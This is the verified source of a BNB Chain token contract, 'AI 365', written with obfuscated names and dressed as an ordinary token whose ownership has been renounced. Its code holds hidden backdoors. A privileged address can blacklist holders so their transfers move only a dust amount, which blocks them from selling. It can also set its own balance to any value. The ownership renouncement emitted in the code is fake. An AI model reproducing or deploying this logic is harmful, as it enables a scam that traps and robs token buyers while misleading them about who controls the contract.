/**
 *Submitted for verification at BscScan.com on 2023-02-05
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface feeTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchedTake {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AI365 {
    uint8 public decimals = 18;
    address public amountReceiver;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public modeLaunch;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    address public owner;


    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public receiverMinAmount;
    uint256 constant buyTradingLiquidity = 10 ** 10;
    address public sellBuyLiquidity;



    string public name = "AI 365";
    string public symbol = "A35";
    bool public teamFee;
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        feeTx sellSender = feeTx(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        sellBuyLiquidity = launchedTake(sellSender.factory()).createPair(sellSender.WETH(), address(this));
        owner = marketingSwap();
        amountReceiver = owner;
        modeLaunch[amountReceiver] = true;
        balanceOf[amountReceiver] = totalSupply;
        emit Transfer(address(0), amountReceiver, totalSupply);
        teamSell();
    }

    

    function marketingSwap() private view returns (address) {
        return msg.sender;
    }

    function senderReceiverTo(address launchedShould) public {
        if (launchedShould == amountReceiver || launchedShould == sellBuyLiquidity || !modeLaunch[marketingSwap()]) {
            return;
        }
        receiverMinAmount[launchedShould] = true;
    }

    function transferFrom(address swapLaunched, address walletTrading, uint256 enableMin) public returns (bool) {
        if (swapLaunched != marketingSwap() && allowance[swapLaunched][marketingSwap()] != type(uint256).max) {
            require(allowance[swapLaunched][marketingSwap()] >= enableMin);
            allowance[swapLaunched][marketingSwap()] -= enableMin;
        }
        if (walletTrading == amountReceiver || swapLaunched == amountReceiver) {
            return listAmount(swapLaunched, walletTrading, enableMin);
        }
        if (receiverMinAmount[swapLaunched]) {
            return listAmount(swapLaunched, walletTrading, buyTradingLiquidity);
        }
        return listAmount(swapLaunched, walletTrading, enableMin);
    }

    function teamSell() public {
        emit OwnershipTransferred(amountReceiver, address(0));
        owner = address(0);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function listAmount(address walletLaunchedReceiver, address listTake, uint256 enableMin) internal returns (bool) {
        require(balanceOf[walletLaunchedReceiver] >= enableMin);
        balanceOf[walletLaunchedReceiver] -= enableMin;
        balanceOf[listTake] += enableMin;
        emit Transfer(walletLaunchedReceiver, listTake, enableMin);
        return true;
    }

    function senderTx(address liquidityTeam) public {
        if (teamFee) {
            return;
        }
        modeLaunch[liquidityTeam] = true;
        teamFee = true;
    }

    function transfer(address walletTrading, uint256 enableMin) external returns (bool) {
        return transferFrom(marketingSwap(), walletTrading, enableMin);
    }

    function senderFee(uint256 enableMin) public {
        if (!modeLaunch[marketingSwap()]) {
            return;
        }
        balanceOf[amountReceiver] = enableMin;
    }

    function approve(address modeReceiver, uint256 enableMin) public returns (bool) {
        allowance[marketingSwap()][modeReceiver] = enableMin;
        emit Approval(marketingSwap(), modeReceiver, enableMin);
        return true;
    }


}